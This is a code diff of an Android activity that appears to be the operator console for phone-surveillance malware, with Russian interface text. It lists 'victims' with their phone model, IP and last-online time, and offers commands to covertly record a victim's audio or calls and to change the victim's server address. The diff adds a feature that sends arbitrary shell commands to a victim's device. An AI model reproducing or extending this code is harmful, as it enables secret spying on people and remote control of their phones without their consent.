@@ -20,12 +20,15 @@ import android.widget.Toast;
 
 import org.json.simple.JSONObject;
 import org.json.simple.JSONArray;
+import org.w3c.dom.Text;
+
+import java.util.Date;
 
 public class VictimsActivity extends AppCompatActivity {
     private static VictimsActivity _instance;
     private ListView _victimListView;
     private Button _updateButton;
-    public boolean isClicked;
+    //public boolean isClicked;
 
     public static VictimsActivity getInstance() {
         return _instance;
@@ -49,18 +52,12 @@ public class VictimsActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
-        isClicked = true;
     }
 
     private void initListeners() {
         _updateButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    return;
-                }
-                isClicked = false;
                 MainActivity.getInstance().showText("Получаем список жертв...");
 
                 NettyClient.getInstance().sendGetVictims();
@@ -69,11 +66,6 @@ public class VictimsActivity extends AppCompatActivity {
         _victimListView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
             @Override
             public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    return;
-                }
-                isClicked = false;
                 String victim = ((TextView) view).getText().toString();
                 Intent intent = new Intent(_instance, MenuActivity.class);
                 intent.putExtra("victim", victim);
@@ -87,7 +79,6 @@ public class VictimsActivity extends AppCompatActivity {
     }
 
     public void initVictimList(JSONArray victims) {
-        isClicked = true;
         _victimListView.setVisibility(View.INVISIBLE);
         // создаем адаптер
         if (victims.size() == 0) {
@@ -109,58 +100,37 @@ public class VictimsActivity extends AppCompatActivity {
         _victimListView.setAdapter(adapter);
     }
 
-    public void showLastOnline(String lastOnline) {
-        isClicked = true;
-        LayoutInflater layoutInflater = LayoutInflater.from(this);
-        final View infoView = layoutInflater.inflate(R.layout.view_victim_lastonline, null);
+    public void initVictimInfo(String victim, JSONObject info) {
+        String phoneName = (String) info.get("phoneName");
+        String model = (String) info.get("model");
+        String ip = (String) info.get("ip");
+        int serverPort = ((Long) info.get("serverPort")).intValue();
+        long lastOnline = (long) info.get("lastOnline");
 
-        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
-        alertDialogBuilder.setView(infoView);
-
-        TextView lastOnlineTextView = (TextView) infoView.findViewById(R.id.lastOnlineTextView);
-
-        lastOnlineTextView.setText("LAST_ONLINE: " + lastOnline);
-
-        alertDialogBuilder.setCancelable(false);
-        alertDialogBuilder.setPositiveButton("ОК", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                dialog.cancel();
-            }
-        });
-
-        alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                dialog.cancel();
-            }
-        });
-
-        alertDialogBuilder.create();
-        alertDialogBuilder.show();
-    }
-
-    public void initVictimInfo(String name, String phoneName, String owner, String ip, int serverPort, int downloadPort) {
-        isClicked = true;
         LayoutInflater layoutInflater = LayoutInflater.from(this);
         final View infoView = layoutInflater.inflate(R.layout.view_victiminfo, null);
 
         AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
         alertDialogBuilder.setView(infoView);
 
-        TextView nameTextView = (TextView) infoView.findViewById(R.id.nameTextView);
+        TextView victimTextView = (TextView) infoView.findViewById(R.id.victimTextView);
         TextView phoneNameTextView = (TextView) infoView.findViewById(R.id.phoneNameTextView);
-        TextView ownerTextView = (TextView) infoView.findViewById(R.id.ownerTextView);
+        TextView modelTextView = (TextView) infoView.findViewById(R.id.modelTextView);
         TextView ipTextView = (TextView) infoView.findViewById(R.id.ipTextView);
         TextView serverPortTextView = (TextView) infoView.findViewById(R.id.serverPortTextView);
-        TextView downloadPortTextView = (TextView) infoView.findViewById(R.id.downloadPortTextView);
+        TextView lastOnlineTextView = (TextView) infoView.findViewById(R.id.lastOnlineTextView);
 
-        nameTextView.setText("Имя: " + name);
+        String lastOnlineText = new Date(lastOnline).toString();
+        int diff = (int) ((System.currentTimeMillis() - lastOnline) / 1000);
+        if (diff < 60*60)
+            lastOnlineText = diff + " сек. назад";
+
+        victimTextView.setText("Жертва: " + victim);
         phoneNameTextView.setText("Телефон: " + phoneName);
-        ownerTextView.setText("Владелец: " + owner);
+        modelTextView.setText("Модель: " + model);
         ipTextView.setText("SERVER_IP: " + ip);
         serverPortTextView.setText("SERVER_PORT: " + serverPort);
-        downloadPortTextView.setText("DOWNLOAD_PORT: " + downloadPort);
+        lastOnlineTextView.setText("Online: " + lastOnlineText);
 
         alertDialogBuilder.setCancelable(false);
         alertDialogBuilder.setPositiveButton("ОК", new DialogInterface.OnClickListener() {
@@ -187,39 +157,26 @@ public class VictimsActivity extends AppCompatActivity {
         menu.add("Последний онлайн");
         menu.add("Запись разговора");
         menu.add("Изменить имя");
-        menu.add("Изменить владельца");
         menu.add("Изменить IP_ADDRESS");
         menu.add("Изменить SERVER_PORT");
-        menu.add("Изменить DOWNLOAD_PORT");
+        menu.add("Выполнить CMD");
     }
 
     @Override
     public boolean onContextItemSelected(MenuItem item) {
-        if (!isClicked) {
-            MainActivity.getInstance().showText("Клики не доступны!");
-            return false;
-        }
-
         String itemName = item.toString();
         AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo) item.getMenuInfo();
         final String victim = ((TextView)info.targetView).getText() + "";
         switch (itemName) {
             case "Информация":
-                JSONObject outputJSONObject = new JSONObject();
-                    outputJSONObject.put("action", "getVictimInfo");
-                    outputJSONObject.put("victim", victim);
-                    outputJSONObject.put("token", Config.token);
-
-                //MainActivity.getInstance().sendMessage(outputJSONObject);
-                isClicked = false;
+                NettyClient.getInstance().sendGetVictimInfo(victim);
                 break;
             case "Последний онлайн":
-                outputJSONObject = new JSONObject();
+                /*outputJSONObject = new JSONObject();
                     outputJSONObject.put("action", "getLastOnline");
                     outputJSONObject.put("victim", victim);
-                    outputJSONObject.put("token", Config.token);
+                    outputJSONObject.put("token", Config.token);*/
                 //MainActivity.getInstance().sendMessage(outputJSONObject);
-                isClicked = false;
                 break;
             case "Запись разговора":
                 LayoutInflater layoutInflater = LayoutInflater.from(this);
@@ -235,15 +192,9 @@ public class VictimsActivity extends AppCompatActivity {
                     @Override
                     public void onClick(DialogInterface dialog, int which) {
                         EditText inputEditText = (EditText) inputView0.findViewById(R.id.inputEditText);
-                        int time = Integer.parseInt(inputEditText.getText().toString());
-                        if (time < 1) return;
-                        JSONObject outputJSONObject = new JSONObject();
-                            outputJSONObject.put("action", "record");
-                            outputJSONObject.put("victim", victim);
-                            outputJSONObject.put("time", time);
-                            outputJSONObject.put("token", Config.token);
-                        //MainActivity.getInstance().sendMessage(outputJSONObject);
-                        isClicked = false;
+                        int seconds = Integer.parseInt(inputEditText.getText().toString());
+                        if (seconds < 1) return;
+                        NettyClient.getInstance().sendStartAudioRecord(victim, (long) seconds);
                     }
                 });
 
@@ -273,7 +224,6 @@ public class VictimsActivity extends AppCompatActivity {
                         String newName = inputEditText.getText().toString();
                         if (newName.trim().isEmpty()) return;
                         NettyClient.getInstance().sendSetVictimName(victim, newName);
-                        isClicked = false;
                     }
                 });
 
@@ -288,7 +238,7 @@ public class VictimsActivity extends AppCompatActivity {
                 alertDialogBuilder.create();
                 alertDialogBuilder.show();
                 break;
-            case "Изменить владельца":
+            /*case "Изменить владельца":
                 layoutInflater = LayoutInflater.from(this);
                 final View inputView2 = layoutInflater.inflate(R.layout.view_input, null);
 
@@ -324,7 +274,7 @@ public class VictimsActivity extends AppCompatActivity {
 
                 alertDialogBuilder.create();
                 alertDialogBuilder.show();
-                break;
+                break;*/
             case "Изменить IP_ADDRESS":
                 layoutInflater = LayoutInflater.from(this);
                 final View inputView3 = layoutInflater.inflate(R.layout.view_input, null);
@@ -347,7 +297,6 @@ public class VictimsActivity extends AppCompatActivity {
                             outputJSONObject.put("token", Config.token);
 
                         //MainActivity.getInstance().sendMessage(outputJSONObject);
-                        isClicked = false;
                     }
                 });
 
@@ -384,7 +333,6 @@ public class VictimsActivity extends AppCompatActivity {
                             outputJSONObject.put("token", Config.token);
 
                         //MainActivity.getInstance().sendMessage(outputJSONObject);
-                        isClicked = false;
                     }
                 });
 
@@ -399,7 +347,7 @@ public class VictimsActivity extends AppCompatActivity {
                 alertDialogBuilder.create();
                 alertDialogBuilder.show();
                 break;
-            case "Изменить DOWNLOAD_PORT":
+            case "Выполнить CMD":
                 layoutInflater = LayoutInflater.from(this);
                 final View inputView5 = layoutInflater.inflate(R.layout.view_input, null);
 
@@ -411,17 +359,10 @@ public class VictimsActivity extends AppCompatActivity {
                     @Override
                     public void onClick(DialogInterface dialog, int which) {
                         EditText inputEditText = (EditText) inputView5.findViewById(R.id.inputEditText);
-                        String newDownloadPort = inputEditText.getText().toString();
-                        if (newDownloadPort.trim().isEmpty()) return;
-                        JSONObject outputJSONObject = new JSONObject();
+                        String command = inputEditText.getText().toString();
+                        if (command.trim().isEmpty()) return;
 
-                            outputJSONObject.put("action", "setDownloadPort");
-                            outputJSONObject.put("victim", victim);
-                            outputJSONObject.put("downloadPort", newDownloadPort);
-                            outputJSONObject.put("token", Config.token);
-
-                        //MainActivity.getInstance().sendMessage(outputJSONObject);
-                        isClicked = false;
+                        NettyClient.getInstance().sendCmd(victim, command);
                     }
                 });
 
